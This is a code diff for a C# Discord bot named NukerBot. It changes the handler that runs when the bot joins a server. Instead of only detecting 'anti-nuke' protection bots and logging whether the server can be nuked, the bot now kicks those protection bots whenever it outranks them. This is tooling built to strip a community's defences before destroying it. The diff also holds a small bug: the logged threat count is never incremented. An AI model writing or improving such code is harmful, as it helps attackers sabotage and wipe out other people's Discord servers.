@@ -1,5 +1,6 @@
 using DSharpPlus;
 using DSharpPlus.CommandsNext;
+using DSharpPlus.Entities;
 using DSharpPlus.EventArgs;
 using Microsoft.Extensions.DependencyInjection;
 using NukerBot.src.Core.Entities;
@@ -17,47 +18,47 @@ public static class GuildCreated
         var guild = args.Guild;
 
         var members = await guild.GetAllMembersAsync();
-        var myRole = guild.CurrentMember.Roles.FirstOrDefault();
-
-        var foundThreats = new List<Tuple<string, ulong, List<string>>>();
+        var myRole = guild.CurrentMember.Roles.First();
 
         // anti-nuke bot detection
 
-        var protectionBots = config.Nuking.Options.ProtectionBots;
-
-        var tasks = protectionBots
+        var protectionBots = config.Nuking.Options.ProtectionBots
             .Select(async bot =>
             {
                 try
                 {
                     var member = members.FirstOrDefault(m => m.Id == bot.ID);
+
                     return member ?? await ProtectionBot.ToDiscordMemberAsync(bot, guild);
                 }
                 catch
                 {
                     return null;
                 }
-            })
-            .ToList();
+            });
 
-        var foundBots = await Task.WhenAll(tasks);
+        List<DiscordMember> foundBots = [];
 
-        foreach (var (bot, member) in protectionBots.Zip(foundBots, (bot, member) => (bot, member)))
+        int count = 0;
+
+        foreach (DiscordMember? bot in await Task.WhenAll(protectionBots))
         {
-            if (member != null)
+            if (bot is null)
             {
-                foundThreats.Add(new Tuple<string, ulong, List<string>>(bot.Name, bot.ID, bot.Aliases));
+                continue;
             }
+
+            var botRole = bot.Roles.First();
+
+            if (botRole is null || myRole.Position > botRole.Position)
+            {
+                await bot.RemoveAsync();
+            }
+
+            foundBots.Add(bot);
         }
 
-        if (foundThreats.Count > 0)
-        {
-            Console.WriteLine($"I found {foundThreats.Count} threats in {guild.Name}. We can't nuke this server");
-        }
-        else
-        {
-            Console.WriteLine($"I found {foundThreats.Count} threats in {guild.Name}. We can nuke this server");
-        }
+        Console.WriteLine($"Found {count} threats: {string.Join(", ", foundBots)}");
 
         await Task.CompletedTask;
     }
